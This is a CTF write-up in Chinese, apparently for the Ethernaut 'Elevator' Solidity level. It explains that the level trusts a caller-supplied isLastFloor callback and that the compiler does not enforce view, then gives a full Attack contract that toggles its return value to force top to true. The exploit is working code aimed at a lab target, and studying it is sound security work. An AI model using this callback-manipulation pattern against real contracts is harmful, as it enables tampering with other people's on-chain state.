## 0x01 Task

```javascript
pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

让`top`变成`true`就行

## 0x02 Solution

`Building` 接口中声明了 `isLastFloor` 函数，用户可以自行编写。

在主合约中，先调用 `building.isLastFloor(_floor)` 进行 if 判断，然后将 `building.isLastFloor(_floor)` 赋值给 `top` 。要使 `top = true`，则 `building.isLastFloor(_floor)` 第一次调用需返回 `false`，第二次调用返回 `true`。

思路也很简单，设置一个初始值为 `true` 的变量，每次调用 `isLastFloor()` 函数时，将其取反再返回。

不过，题目中在声明 `isLastFloor` 函数时，赋予了其 `view` 属性，`view` 表示函数会读取合约变量，但是不会修改任何合约的状态。

文档中对`view`的描述

> view functions: The compiler does not enforce yet that a view method is not modifying state.

函数在保证不修改状态情况下可以被声明为视图（view）的形式。但这是松散的，当前 Solidity 编译器没有强制执行视图函数（view function）不能修改状态。

exp：

```javascript
pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attack {

    address instance_address = 0x0d3eff4f690b817a964835ff8f1daae05aea3648;
    Elevator target = Elevator(instance_address);
    bool public isLast = true;

    function isLastFloor(uint) public returns (bool) {
        isLast = ! isLast;
        return isLast;
    }

    function hack() public {
        target.goTo(1024);
    }

}
```

